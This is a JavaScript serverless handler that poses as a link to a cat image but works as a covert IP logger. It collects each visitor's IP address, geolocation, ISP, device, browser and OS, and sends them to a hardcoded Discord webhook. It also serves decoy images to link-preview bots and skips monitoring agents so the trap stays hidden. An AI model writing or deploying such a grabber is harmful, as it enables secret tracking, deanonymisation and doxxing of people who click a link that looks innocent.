// PUBLIC TIER - Basic Logger
module.exports = async function handler(req, res) {
  if (req.method !== "GET" && req.method !== "HEAD") {
    return res.status(405).send("Method Not Allowed");
  }

  const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1531056764127154216/0E10iH35M9cZm2bY1CJ4R1KUnvGkwndndg3NWGv-AAFtdkTLCtxqFS60EHA02Ngrz1NK";
  const TARGET_IMAGE = "https://upload.wikimedia.org/wikipedia/commons/7/7d/Gato_Pantera-Bombay.JPG";
  const BOT_IMAGE = "https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExY3BwZ3c3ZnpxZXR0aTl5NzF1dTN3MXltMHFrNnl2aWh1dmI3anNzYiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/IzigGVSs9fHjug20Mq/giphy.gif";

  const ip = req.headers["cf-connecting-ip"] || req.headers["x-vercel-forwarded-for"]?.split(",")[0] || req.headers["x-forwarded-for"]?.split(",")[0] || req.headers["x-real-ip"] || req.socket?.remoteAddress || "Unknown";
  const ua = req.headers["user-agent"] || "Unknown";

  const ignoreAgents = ["vercel", "vercel-favicon", "node", "axios", "curl", "wget", "uptime", "statuscake"];
  if (new RegExp(ignoreAgents.join("|"), "i").test(ua)) {
    return res.redirect(302, TARGET_IMAGE);
  }

  if (/(bot|crawler|spider|discordbot|telegrambot|slackbot|facebookexternalhit|twitterbot|linkedinbot|pinterest|whatsapp|skypeuripreview|googlebot|bingbot|yandex)/i.test(ua) || req.method === "HEAD") {
    return res.redirect(302, BOT_IMAGE);
  }

  const browser = (() => {
    const u = ua.toLowerCase();
    if (u.includes("firefox")) return "Firefox";
    if (u.includes("edg")) return "Edge";
    if (u.includes("brave")) return "Brave";
    if (u.includes("chrome") && !u.includes("edg")) return "Chrome";
    if (u.includes("safari") && !u.includes("chrome")) return "Safari";
    return "Unknown";
  })();

  const device = /mobile|android|iphone/i.test(ua) ? "Mobile" : /ipad|tablet/i.test(ua) ? "Tablet" : "Desktop";
  const system = /windows/i.test(ua) ? "Windows" : /android/i.test(ua) ? "Android" : /iphone|ios/i.test(ua) ? "iOS" : /mac/i.test(ua) ? "MacOS" : /linux/i.test(ua) ? "Linux" : "Unknown";

  let geo = {};
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,timezone,query`);
    if (geoRes.ok) geo = await geoRes.json();
  } catch {}

  const embed = {
    title: "NUEVA CAPTURA PUBLICA",
    color: 0x00ff88,
    fields: [
      { name: "IP", value: ip, inline: false },
      { name: "Ubicación", value: `${geo.city || "Unknown"}, ${geo.country || ""}`, inline: false },
      { name: "ISP", value: geo.isp || "Unknown", inline: false },
      { name: "Dispositivo", value: device, inline: true },
      { name: "Navegador", value: browser, inline: true },
      { name: "SO", value: system, inline: true },
      { name: "User Agent", value: "```" + ua.substring(0, 150) + "```", inline: false }
    ],
    timestamp: new Date().toISOString()
  };

  await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: "Public Logger", embeds: [embed] })
  }).catch(() => {});

  return res.redirect(302, TARGET_IMAGE);
};
